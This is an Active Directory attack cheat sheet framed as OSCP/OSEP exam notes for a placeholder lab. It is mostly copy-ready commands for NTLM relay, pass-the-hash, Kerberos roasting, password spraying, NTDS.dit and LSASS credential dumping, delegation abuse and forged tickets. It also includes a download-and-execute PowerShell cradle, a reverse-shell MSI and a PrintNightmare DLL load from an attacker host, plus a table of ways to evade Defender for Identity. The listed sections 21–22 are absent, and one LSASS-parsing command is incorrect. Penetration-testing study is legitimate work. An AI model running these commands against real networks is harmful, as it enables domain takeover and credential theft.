# Active Directory Penetration Testing — OSCP/OSEP Study Guide
> **Section 4.2 — Windows Infrastructure: Penetration Testing Active Directory**
> Compiled for exam preparation. All commands use placeholder lab environment (VULN.local / 10.10.10.x).

---

## Table of Contents

1. [What is Active Directory](#1-what-is-active-directory)
2. [Pivoting in the Infrastructure Network](#2-pivoting-in-the-infrastructure-network)
3. [NTLM, Kerberos and OAuth Theory](#3-ntlm-kerberos-and-oauth-theory)
4. [NTLM Relay Attacks](#4-ntlm-relay-attacks)
5. [Pass-The-Hash (PtH)](#5-pass-the-hash-pth)
6. [LLMNR Poisoning](#6-llmnr-poisoning)
7. [Kerberoasting](#7-kerberoasting)
8. [AS-REP Roasting](#8-as-rep-roasting)
9. [Password Spraying](#9-password-spraying)
10. [Default & Hard-Coded Credentials](#10-default--hard-coded-credentials)
11. [LDAP Reconnaissance](#11-ldap-reconnaissance)
12. [SharpHound + BloodHound](#12-sharphound--bloodhound)
13. [NTDS.dit Extraction](#13-ntdsdit-extraction)
14. [Business Logic / Misconfigurations](#14-business-logic--misconfigurations)
15. [Credential Dumping with Mimikatz / Kiwi](#15-credential-dumping-with-mimikatz--kiwi)
16. [Lateral Movement with Evil-WinRM](#16-lateral-movement-with-evil-winrm)
17. [Shadow Credentials](#17-shadow-credentials)
18. [Resource-Based Constrained Delegation (RBCD)](#18-resource-based-constrained-delegation-rbcd)
19. [PrintNightmare / PetitPotam](#19-printnightmare--petitpotam)
20. [Defender for Identity Bypasses](#20-defender-for-identity-bypasses)
21. [Persistence Techniques](#21-persistence-techniques)
22. [Quick Reference — Tool Comparison Table](#22-quick-reference--tool-comparison-table)

---

## 1. What is Active Directory

### Core Concepts
Active Directory (AD) is Microsoft's directory service for Windows domain networks. It centralizes authentication and authorization.

**Key Components:**
- **Domain** — Logical grouping of objects (users, computers, groups)
- **Domain Controller (DC)** — Server running AD DS; holds the database (NTDS.dit)
- **Forest** — Collection of one or more domains sharing a schema
- **Trust** — Relationship allowing one domain to access resources in another
- **OU (Organizational Unit)** — Container to organize objects and apply GPOs
- **GPO (Group Policy Object)** — Policy settings applied to users/computers

### FSMO Roles (Flexible Single Master Operations)
| Role | Scope | Purpose |
|------|-------|---------|
| Schema Master | Forest | Controls schema modifications |
| Domain Naming Master | Forest | Controls adding/removing domains |
| PDC Emulator | Domain | Password changes, time sync, legacy auth |
| RID Master | Domain | Allocates RID pools to DCs |
| Infrastructure Master | Domain | Resolves cross-domain object references |

### Initial Enumeration (Post-foothold)
```powershell
# Basic system info
systeminfo
hostname
whoami /all

# Network
ipconfig /all
route print
arp -a
nslookup VULN.local

# Domain info
net view /domain
net view /domain:VULN
nltest /domain_trusts
Get-ADDomain

# User context
net user %username% /domain
klist  # list Kerberos tickets
```

---

## 2. Pivoting in the Infrastructure Network

### Tool: Ligolo-ng (Agent ↔ Proxy)

**Download:**
```bash
# On Linux (Kali) — Proxy
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo*

# On Windows (target) — Agent
# Upload: ligolo-ng_agent_0.8.2_windows_amd64.zip
```

**Setup on Linux:**
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
ip a   # verify ligolo interface exists

./proxy -selfcert   # start proxy (note the port shown)
```

**Setup on Windows target:**
```powershell
# Basic
agent.exe --connect <KALI_IP>:<PORT> -ignore-cert

# Background / stealth
Start-Process -FilePath "agent.exe" -ArgumentList "--connect <KALI_IP>:<PORT> -ignore-cert" -WindowStyle Hidden

# No window, fully hidden
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "agent.exe"
$psi.Arguments = "--connect <KALI_IP>:<PORT> -ignore-cert"
$psi.WindowStyle = 'Hidden'
$psi.CreateNoWindow = $true
$psi.UseShellExecute = $false
[System.Diagnostics.Process]::Start($psi)
```

**Activate tunnel (Ligolo terminal):**
```bash
session
session:1

# Add route on Kali
sudo ip route add 10.10.10.0/24 dev ligolo
route   # verify

# In Ligolo tab
start   # tunnel is now UP
```

### Other Pivoting Methods
```bash
# SSH local port forward
ssh -L 8080:TARGET:80 user@PIVOT

# SSH dynamic SOCKS proxy
ssh -D 1080 user@PIVOT
proxychains nmap -sT TARGET

# Chisel (HTTP tunnel)
# Server (Kali):
./chisel server -p 9001 --reverse
# Client (target):
chisel.exe client KALI_IP:9001 R:socks
```

---

## 3. NTLM, Kerberos and OAuth Theory

### NTLM Authentication Flow
```
Client → Server: Negotiate
Server → Client: Challenge (nonce)
Client → Server: Response (HMAC-MD5 of challenge + NT hash)
Server → DC:     Verify response
DC → Server:     Accept/Deny
```
- **Weakness:** The NT hash can be captured from the network challenge/response and cracked or relayed.
- **Net-NTLMv1 / Net-NTLMv2** are the formats seen on the wire (captured by Responder). These **cannot** be passed directly — they must be cracked or relayed.
- **NTLM Hash (NT Hash)** from the SAM/NTDS *can* be passed directly (Pass-the-Hash).

### Kerberos Authentication Flow
```
1. Client → DC (AS-REQ): Request TGT (with timestamp encrypted by user's key)
2. DC → Client (AS-REP): TGT encrypted with krbtgt hash + session key
3. Client → DC (TGS-REQ): Request Service Ticket using TGT
4. DC → Client (TGS-REP): TGS (service ticket) encrypted with service account's hash
5. Client → Service (AP-REQ): Present TGS
6. Service validates ticket (no DC involved)
```

**Key tickets:**
- **TGT (Ticket Granting Ticket)** — Proves identity to DC; encrypted with `krbtgt` hash
- **TGS (Ticket Granting Service)** — Service-specific ticket; encrypted with service account's NT hash
- **ST (Service Ticket)** — Same as TGS, used interchangeably

**Kerberos attack surface:**
| Attack | What's targeted | What you get |
|--------|----------------|--------------|
| Kerberoasting | TGS of SPN accounts | Offline crack of service account password |
| AS-REP Roasting | AS-REP of no-preauth users | Offline crack of user password |
| Pass-The-Ticket | Existing TGT/TGS | Impersonation without password |
| Golden Ticket | krbtgt hash | Forge any TGT forever |
| Silver Ticket | Service account hash | Forge TGS for specific service |
| Overpass-the-Hash | NT hash | Convert to Kerberos TGT |

### OAuth / SAML (Brief)
- Modern federated auth used alongside AD (ADFS, Azure AD)
- Tokens can be stolen from browser storage or memory
- Golden SAML attack — forge SAML assertions using stolen ADFS signing cert

---

## 4. NTLM Relay Attacks

### Theory
When SMB signing is **disabled**, captured NTLM challenges can be forwarded to another host. The attacker becomes a man-in-the-middle: victim authenticates to attacker, attacker relays to target.

**Requirements:**
- SMB signing disabled on target (check with `nxc smb 10.10.10.0/24 --gen-relay-list`)
- A victim that will authenticate (triggered by LLMNR/NBT-NS poisoning or coercion)

### Tools
- **Responder** — Poisons LLMNR/mDNS/NBT-NS to capture hashes
- **ntlmrelayx.py** — Relays authentication to targets

### Commands
```bash
# Step 1 — Identify hosts without SMB signing
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# Step 2 — Start Responder (turn OFF SMB and HTTP to let ntlmrelayx handle them)
# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off
sudo responder -I eth0 -dwv

# Step 3 — Relay to SMB (dump hashes)
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support

# Step 3 (alt) — Relay to LDAP (create admin user)
sudo ntlmrelayx.py -t ldap://10.10.10.100 --escalate-user lowpriv_user

# Step 3 (alt) — Interactive SMB shell
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -i

# Step 3 (alt) — Execute a command on relay
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -c "powershell -enc <base64>"
```

### Coercion (Force Authentication)
```bash
# PetitPotam — coerce DC to authenticate to attacker
python3 PetitPotam.py -u dritchie -p 'P@ssw0rd123' ATTACKER_IP DC_IP

# PrinterBug / SpoolSample
python3 printerbug.py VULN.local/dritchie:P@ssw0rd123@DC_IP ATTACKER_IP
```

---

## 5. Pass-The-Hash (PtH)

### Theory
NTLM authentication uses the NT hash directly in the challenge-response. If you have the NT hash (from SAM, NTDS, or Mimikatz), you can authenticate without knowing the plaintext password.

**Works against:** SMB, WinRM, RDP (NLA disabled), WMI  
**Does NOT work against:** Kerberos-only services, systems with Protected Users group

### Commands
```bash
# Impacket PsExec
impacket-psexec Administrator@10.10.10.100 -hashes :920ae267e048417fcfe00f49ecbd4b33

# Impacket SMBExec (stealthier)
impacket-smbexec Administrator@10.10.10.100 -hashes :920ae267e048417fcfe00f49ecbd4b33

# Impacket WMIExec (stealthiest)
impacket-wmiexec Administrator@10.10.10.100 -hashes :920ae267e048417fcfe00f49ecbd4b33

# Impacket DCOMExec
impacket-dcomexec Administrator@10.10.10.100 -hashes :920ae267e048417fcfe00f49ecbd4b33

# Evil-WinRM
evil-winrm -u Administrator -H 920ae267e048417fcfe00f49ecbd4b33 -i 10.10.10.100

# NetExec / CrackMapExec
nxc smb 10.10.10.100 -u Administrator -H 920ae267e048417fcfe00f49ecbd4b33 -x "whoami"
crackmapexec smb 10.10.10.100 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33' -x "whoami /priv"

# Mimikatz (Windows)
sekurlsa::pth /user:Administrator /domain:VULN.local /ntlm:920ae267e048417fcfe00f49ecbd4b33 /run:cmd.exe
```

**Hash format:**  
`LM:NT` → `aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33`  
Empty LM: `-hashes :920ae267e048417fcfe00f49ecbd4b33`

### Tool Stealth Comparison
| Tool | Protocol | Port | Stealth | Notes |
|------|----------|------|---------|-------|
| psexec | SMB/RPC | 445 | Low | Creates a service — very noisy |
| smbexec | SMB | 445 | Medium | Named pipes, no service created |
| wmiexec | WMI | 135 | High | Output via SMB share |
| dcomexec | DCOM | 135 | High | Modern Windows |
| evil-winrm | WinRM | 5985/5986 | High | Requires WinRM enabled |

---

## 6. LLMNR Poisoning

### Theory
**LLMNR (Link-Local Multicast Name Resolution)** and **NBT-NS** are fallback name resolution protocols when DNS fails. An attacker on the same network segment can respond to these broadcast queries and capture Net-NTLMv2 hashes.

**Attack flow:**
1. Victim types `\\FILESERVER` (typo or misconfiguration)
2. DNS fails → victim broadcasts LLMNR query
3. Attacker responds: "That's me!"
4. Victim sends Net-NTLMv2 hash to attacker

### Commands
```bash
# Capture hashes (Responder)
sudo responder -I eth0 -dwv

# Captured hashes saved to: /usr/share/responder/logs/

# Crack with Hashcat (Net-NTLMv2 = mode 5600)
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt captured_hashes.txt
```

### Defense
- Disable LLMNR: GPO → Computer Config → Admin Templates → Network → DNS Client → "Turn off multicast name resolution" = Enabled
- Disable NBT-NS: Network adapter properties → WINS → "Disable NetBIOS over TCP/IP"

---

## 7. Kerberoasting

### Theory
Any authenticated domain user can request a TGS for any service with an SPN registered. The TGS is encrypted with the **service account's NT hash**. This ticket can be taken offline and cracked — no interaction with the service account or target machine required.

**Requirements:** Valid domain credentials (any user)

### Commands

**Linux (Impacket):**
```bash
# List SPNs (no ticket request)
impacket-GetUserSPNs -dc-ip 10.10.10.100 VULN.LOCAL/dritchie:P@ssw0rd123

# Request tickets
impacket-GetUserSPNs -dc-ip 10.10.10.100 VULN.LOCAL/dritchie:P@ssw0rd123 -request -outputfile kerberoast_hashes.txt

# Kerberos auth (if NTLM disabled)
impacket-GetUserSPNs -dc-ip 10.10.10.100 VULN.LOCAL/dritchie:P@ssw0rd123 -k -request
```

**Windows (Rubeus):**
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Target specific user
.\Rubeus.exe kerberoast /user:SQLService /outfile:hashes.txt
```

**Windows (PowerShell):**
```powershell
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII kerberoast.txt
```

**Crack:**
```bash
# Hashcat (mode 13100 = Kerberos TGS-REP)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# John
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
```

**Lateral movement after cracking:**
```bash
evil-winrm -i 10.10.10.100 -u SQLService -p 'MYpassword123#'
```

---

## 8. AS-REP Roasting

### Theory
When a user has **"Do not require Kerberos preauthentication"** enabled, the DC will respond to an AS-REQ without verifying identity. The AS-REP contains data encrypted with the **user's NT hash**, which can be cracked offline.

**No credentials required** (if you have a username list).

### Commands

**Linux (Impacket):**
```bash
# With credentials — enumerate vulnerable users and request tickets
python GetNPUsers.py VULN.local/dritchie:P@ssw0rd123 -request -format hashcat -outputfile asrep_hashes.txt

# Without credentials — need username list
python GetNPUsers.py VULN.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# LDAP search to identify vulnerable users first
ldapsearch -x -H ldap://10.10.10.100 -b "dc=VULN,dc=local" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName | grep sAMAccountName
```

**Windows (Rubeus):**
```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
```

**Windows (PowerView):**
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname
```

**Crack:**
```bash
# Hashcat (mode 18200 = Kerberos AS-REP)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# John
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

---

## 9. Password Spraying

### Theory
Try **one password against many accounts** to avoid lockout. Check the domain password policy first.

```powershell
# Check lockout threshold
net accounts /domain
Get-ADDefaultDomainPasswordPolicy
```

### Commands

**Kerbrute (fast, Kerberos-based, low noise):**
```bash
# Download
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
mv kerbrute_linux_amd64 kerbrute && chmod +x kerbrute && sudo mv kerbrute /usr/bin/kerbrute

# Spray
kerbrute passwordspray -d VULN.local --dc 10.10.10.100 users.txt 'Password123'

# Userenum (validate users)
kerbrute userenum -d VULN.local --dc 10.10.10.100 usernames.txt
```

**NetExec / CrackMapExec:**
```bash
nxc smb 10.10.10.100 -u users.txt -p 'Password123' --continue-on-success
crackmapexec smb 10.10.10.100 -u users.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

**Hydra:**
```bash
hydra -L users.txt -p 'Password123' 10.10.10.100 smb
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.100 ssh
```

---

## 10. Default & Hard-Coded Credentials

### Theory
Vendors ship devices and software with default credentials. Service accounts, scripts, and config files often contain hard-coded passwords. Always check:

- Default admin credentials for the specific product
- Credentials stored in scripts, web.config, appsettings.json
- Password reuse across accounts/systems

### Quick Checks
```powershell
# Search for passwords in files (Windows)
findstr /si "password" *.xml *.ini *.txt *.config
Get-ChildItem -Recurse | Select-String -Pattern "password" -ErrorAction SilentlyContinue

# Common locations
C:\inetpub\wwwroot\web.config
C:\Windows\Panther\unattend.xml
C:\Windows\System32\sysprep\sysprep.xml
%APPDATA%\..\..\Local\Packages\*\
```

```bash
# Linux equivalent
grep -r "password" /var/www/ --include="*.php" 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \;
```

### Enumerate Servers (Initial Scanning)
```bash
crackmapexec smb 10.10.10.0/24
crackmapexec rdp 10.10.10.0/24
crackmapexec ldap 10.10.10.0/24
crackmapexec winrm 10.10.10.0/24
```

---

## 11. LDAP Reconnaissance

### Theory
LDAP is the protocol used to query Active Directory. Authenticated users can enumerate all domain objects, group memberships, SPNs, password policies, etc.

### Commands
```bash
# ldapdomaindump — dumps everything to HTML/JSON
ldapdomaindump -u 'VULN\dritchie' -p 'P@ssw0rd123' 10.10.10.100
# Output: domain_users.html, domain_groups.html, domain_computers.html etc.

# ldapsearch — manual queries
ldapsearch -x -H ldap://10.10.10.100 -D 'VULN\dritchie' -w 'P@ssw0rd123' -b "dc=VULN,dc=local" "(objectClass=user)" sAMAccountName

# Find all users with SPN (Kerberoast candidates)
ldapsearch -x -H ldap://10.10.10.100 -D 'VULN\dritchie' -w 'P@ssw0rd123' -b "dc=VULN,dc=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Find users without pre-auth (AS-REP Roast candidates)
ldapsearch -x -H ldap://10.10.10.100 -b "dc=VULN,dc=local" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
```

**PowerShell (on Windows):**
```powershell
# All domain users
Get-ADUser -Filter * | Select-Object SamAccountName,Enabled

# Privileged groups
Get-ADGroupMember -Identity "Domain Admins" -Recursive
Get-ADGroupMember -Identity "Enterprise Admins" -Recursive

# Computers
Get-ADComputer -Filter * | Select-Object Name,OperatingSystem

# SPNs
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object SamAccountName,ServicePrincipalName

# GPOs
Get-GPO -All
```

---

## 12. SharpHound + BloodHound

### Theory
BloodHound maps relationships between AD objects (users, groups, computers, GPOs) and identifies attack paths to Domain Admin using graph theory.

**SharpHound** is the data collector (runs on Windows or via LDAP from Linux).

### Install BloodHound (Single Command)
```bash
wget "https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz" \
  && tar -xvzf bloodhound-cli-linux-amd64.tar.gz \
  && sudo apt update \
  && sudo apt install docker.io -y \
  && sudo apt install docker-compose -y \
  && sudo systemctl start docker \
  && sudo systemctl enable docker \
  && docker compose version \
  && sudo ./bloodhound-cli install
```

### Collect Data

**Windows (SharpHound):**
```powershell
# Run SharpHound — all collection methods
.\SharpHound.exe -c All --outputdirectory C:\temp\

# Stealth — LDAP only (no network connections to machines)
.\SharpHound.exe -c DCOnly

# Domain trusts
.\SharpHound.exe -c All --collectallproperties
```

**Linux (BloodHound-python):**
```bash
pip install bloodhound
bloodhound-python -u dritchie -p 'P@ssw0rd123' -d VULN.local -ns 10.10.10.100 -c All
```

### Key BloodHound Queries (Pre-built)
- **Shortest Path to Domain Admins** — Most important for exam
- **Find all Domain Admins**
- **Find Kerberoastable Users with High Value Targets**
- **Find AS-REP Roastable Users**
- **Computers where Domain Users are Local Admin**
- **Shortest Path from Owned Principals** (mark compromised accounts as Owned)

### Custom Cypher Queries
```cypher
// Find all paths from owned to DA
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@VULN.LOCAL"})) RETURN p

// Users with DCSync rights
MATCH (u)-[:GetChanges|GetChangesAll]->(d:Domain) RETURN u.name
```

---

## 13. NTDS.dit Extraction

### Theory
`NTDS.dit` is the Active Directory database — it contains **all domain user hashes**. Located at `C:\Windows\NTDS\ntds.dit` on Domain Controllers. Locked while AD is running, so it must be extracted using Volume Shadow Copies (VSS) or the ntdsutil tool.

### Method 1 — ntdsutil (interactive)
```cmd
ntdsutil
activate instance ntds
ifm
create full C:\ntdsutil
quit
quit
```

### Method 2 — VSS (Shadow Copy)
```cmd
# Create shadow copy
vssadmin create shadow /for=C:

# Copy NTDS.dit from shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Delete shadow copy after (cleanup)
vssadmin delete shadows /shadow={SHADOW_ID}
```

### Method 3 — NetExec remote dump (if DA)
```bash
nxc smb 10.10.10.100 -u Administrator -H 920ae267e048417fcfe00f49ecbd4b33 --ntds
nxc smb 10.10.10.100 -u Administrator -H 920ae267e048417fcfe00f49ecbd4b33 --ntds --sam --dpapi --lsa
```

**What each flag dumps:**
| Flag | Content | Requirement |
|------|---------|-------------|
| `--ntds` | All domain user hashes | DC only |
| `--sam` | Local account hashes | Any machine |
| `--dpapi` | Browser passwords, certs | Any machine |
| `--lsa` | Service account passwords, cached logons | Any machine |

### Extract Hashes Offline
```bash
# After transferring ntds.dit + SYSTEM to Kali
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Remote DCSync (no file needed — if you have DCSync rights)
impacket-secretsdump VULN.local/Administrator:'P@$$w0rd!'@10.10.10.100
```

### DCSync with Mimikatz
```powershell
# Requires: Domain Admin / Replication rights
lsadump::dcsync /domain:VULN.local /user:Administrator
lsadump::dcsync /domain:VULN.local /all /csv
```

---

## 14. Business Logic / Misconfigurations

### Common AD Misconfigurations

**GPO Abuse:**
```powershell
Get-GPO -All
Get-GPOReport -All -ReportType Html -Path C:\temp\GPOReport.html
# Look for: scripts running as SYSTEM, startup items, write permissions to GPO folders
```

**ACL Abuse:**
Look in BloodHound for edges like:
- `GenericAll` → Full control over object (reset password, add to group)
- `GenericWrite` → Write any attribute (set SPN for Kerberoasting, set msDS-KeyCredentialLink for Shadow Creds)
- `WriteDACL` → Modify permissions on object
- `WriteOwner` → Take ownership
- `ForceChangePassword` → Reset password without knowing current one
- `AllExtendedRights` → Includes all above

**Writable Service Paths:**
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```

**AlwaysInstallElevated:**
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1, generate malicious .msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

---

## 15. Credential Dumping with Mimikatz / Kiwi

### Mimikatz (Windows)
```powershell
# Run as Administrator
mimikatz.exe

# Enable debug privileges
privilege::debug

# Dump plaintext passwords from LSASS
sekurlsa::logonpasswords

# Dump NT hashes from LSASS
sekurlsa::msv

# Dump SAM database
lsadump::sam

# Dump LSA secrets
lsadump::secrets

# DCSync (requires Replication rights)
lsadump::dcsync /domain:VULN.local /user:Administrator
lsadump::dcsync /domain:VULN.local /all /csv

# Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:VULN.local /ntlm:HASH /run:cmd.exe

# Golden Ticket
kerberos::golden /user:fakeadmin /domain:VULN.local /sid:S-1-5-21-... /krbtgt:KRBTGTHASH /ptt

# Silver Ticket
kerberos::golden /user:admin /domain:VULN.local /sid:S-1-5-21-... /target:dc01.VULN.local /service:cifs /rc4:HASH /ptt

# Inject ticket
kerberos::ptt ticket.kirbi

# Export tickets
sekurlsa::tickets /export
```

### Kiwi (Meterpreter)
```bash
# In meterpreter session
load kiwi

creds_all          # dump all credentials
lsa_dump_sam       # dump SAM
lsa_dump_secrets   # dump LSA secrets
hashdump           # dump NT hashes
golden_ticket_create -d VULN.local -u fakeadmin -s S-1-5-21-... -k KRBTGT_HASH -t ticket.kirbi
```

### Registry Hives (manual, no tools)
```powershell
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save
reg save HKLM\SECURITY C:\temp\security.save

# Transfer to Kali and extract
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

### LSASS Dump (for offline analysis)
```powershell
# Task Manager → Details → lsass.exe → Create dump file

# ProcDump
.\procdump.exe -ma lsass.exe lsass.dmp

# PowerShell (admin)
$proc = Get-Process lsass
$wer = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
# ... (various methods to avoid AV)
```

```bash
# Analyze dump on Kali
impacket-secretsdump -just-dc -ntds lsass.dmp LOCAL
# Or with Mimikatz on Windows:
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

---

## 16. Lateral Movement with Evil-WinRM

### Theory
Windows Remote Management (WinRM) uses HTTP(S) to provide remote PowerShell management. Evil-WinRM is a full-featured shell for pentesting.

**Ports:** 5985 (HTTP) / 5986 (HTTPS)  
**Requirements:** WinRM enabled, user is in "Remote Management Users" or local admin

### Commands
```bash
# Password auth
evil-winrm -i 10.10.10.100 -u dritchie -p 'P@ssw0rd123'

# Pass-the-Hash
evil-winrm -u Administrator -H 920ae267e048417fcfe00f49ecbd4b33 -i 10.10.10.100

# HTTPS (port 5986)
evil-winrm -i 10.10.10.100 -u admin -p Password -S -k key.pem -c cert.pem

# Upload scripts directory (auto-loads PowerShell modules)
evil-winrm -i 10.10.10.100 -u admin -H HASH -s /opt/PowerSploit/

# Execute PowerShell scripts
evil-winrm -i 10.10.10.100 -u admin -H HASH -e /path/to/executables

# Explicit port
evil-winrm -u Administrator -H HASH -i 10.10.10.100 -p 5985
```

### Within Evil-WinRM Session
```powershell
# Upload file
upload /local/path/file.exe C:\Windows\Temp\file.exe

# Download file
download C:\Windows\NTDS\ntds.dit /local/path/ntds.dit

# Load a PowerShell script (from -s directory)
Invoke-BloodHound -CollectionMethod All

# Bypass AMSI (in session)
Bypass-4MSI
```

---

## 17. Shadow Credentials

### Theory
The `msDS-KeyCredentialLink` attribute allows certificate-based authentication via PKINIT. If you have `GenericWrite` or `GenericAll` over a user/computer account, you can write a certificate to this attribute, then authenticate as that account to get its TGT (and NT hash via PKINIT).

**Requirements:**
- ADCS (Active Directory Certificate Services) running
- `GenericWrite` on target object

### Commands
```bash
# Linux — pywhisker
python3 pywhisker.py -d VULN.local -u dritchie -p 'P@ssw0rd123' --target victimuser --action add

# Gets you: cert.pfx + cert password

# Request TGT using the certificate
python3 gettgtpkinit.py VULN.local/victimuser -cert-pfx cert.pfx -pfx-pass PASSWORD ccache_file
export KRB5CCNAME=ccache_file

# Get NT hash via PKINIT
python3 getnthash.py VULN.local/victimuser -key KEY
```

```powershell
# Windows — Whisker
.\Whisker.exe add /target:victimuser /domain:VULN.local /dc:dc01.VULN.local

# Windows — Rubeus (using generated cert)
.\Rubeus.exe asktgt /user:victimuser /certificate:BASE64_CERT /password:CERT_PASS /domain:VULN.local /dc:10.10.10.100 /getcredentials
```

---

## 18. Resource-Based Constrained Delegation (RBCD)

### Theory
RBCD allows a resource (computer) to specify which accounts can delegate to it via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. If you have `GenericWrite` over a computer object, you can configure RBCD to impersonate any user to that machine.

**Attack flow:**
1. Create/identify a computer account you control (or use `MachineAccountQuota > 0`)
2. Set `msDS-AllowedToActOnBehalfOfOtherIdentity` on target computer to allow your controlled account
3. Request a service ticket impersonating a high-value user (DA) to the target

### Commands
```bash
# Step 1 — Create a fake computer account (if MachineAccountQuota > 0)
impacket-addcomputer VULN.local/dritchie:'P@ssw0rd123' -computer-name 'EVIL$' -computer-pass 'EvilPass123!'

# Step 2 — Set RBCD on target computer
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGETPC$' -action write VULN.local/dritchie:'P@ssw0rd123' -dc-ip 10.10.10.100

# Step 3 — Get service ticket impersonating Administrator
impacket-getST -spn cifs/TARGETPC.VULN.local -impersonate Administrator VULN.local/'EVIL$':'EvilPass123!' -dc-ip 10.10.10.100

# Step 4 — Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec VULN.local/Administrator@TARGETPC.VULN.local -k -no-pass
```

```powershell
# PowerView + Rubeus (Windows)
# Set RBCD
Set-ADComputer TARGETPC -PrincipalsAllowedToDelegateToAccount EVIL$

# Get ticket
.\Rubeus.exe s4u /user:EVIL$ /rc4:EVIL_HASH /impersonateuser:Administrator /msdsspn:cifs/TARGETPC.VULN.local /ptt
```

---

## 19. PrintNightmare / PetitPotam

### PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
**Theory:** A vulnerability in the Windows Print Spooler (spoolsv.exe) allowing remote code execution and LPE. Even low-privileged users can trigger it.

```bash
# Check if vulnerable
rpcdump.py @10.10.10.100 | grep 'MS-RPRN\|MS-PAR'

# Exploit — remote DLL load as SYSTEM
python3 CVE-2021-1675.py VULN.local/dritchie:'P@ssw0rd123'@10.10.10.100 '\\ATTACKER_IP\share\evil.dll'

# On Kali — host the DLL via SMB
impacket-smbserver share /path/to/malicious/ -smb2support

# Mimikatz via PrintNightmare
.\SharpPrintNightmare.exe '\\ATTACKER_IP\share\evil.dll'
```

### PetitPotam (CVE-2021-36942)
**Theory:** Forces a Domain Controller to authenticate to an attacker's machine via the EFS RPC interface. Combined with NTLM relay to AD CS, it can generate certificates for the DC — enabling full domain compromise.

```bash
# Trigger authentication from DC to attacker (authenticated)
python3 PetitPotam.py -u dritchie -p 'P@ssw0rd123' -d VULN.local ATTACKER_IP DC_IP

# Unauthenticated (patched versions require auth)
python3 PetitPotam.py ATTACKER_IP DC_IP

# Combined with NTLM relay → AD CS
# Step 1 — Relay to ADCS HTTP enrollment
ntlmrelayx.py -t http://ADCS_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Step 2 — Trigger PetitPotam
python3 PetitPotam.py ATTACKER_IP DC_IP

# Step 3 — Get base64 cert, use with Rubeus for TGT
.\Rubeus.exe asktgt /user:DC$ /certificate:BASE64_CERT /ptt

# Step 4 — DCSync
mimikatz # lsadump::dcsync /all /csv
```

---

## 20. Defender for Identity Bypasses

### Overview
Microsoft Defender for Identity (MDI) monitors AD events and network traffic for suspicious behaviors. Understanding what it detects helps during red team / OSEP.

### MDI Detections and Bypasses

| Attack | MDI Detection | Bypass |
|--------|--------------|--------|
| Password Spray | 4625/4771 events | Slow spray (1 attempt per 30min), use valid usernames only |
| Kerberoasting | TGS-REQ for many SPNs | Target only 1-2 high-value SPNs, use AES if supported |
| AS-REP Roasting | Unusual AS-REQ patterns | Hard to avoid, minimize noise |
| DCSync | 4662 Replication events | Use legitimate replication windows |
| Pass-the-Hash | Abnormal NTLM auth patterns | Use Kerberos instead (Overpass-the-Hash) |
| Golden Ticket | TGT with >10 year lifetime | Set realistic expiry, use /renewmax |
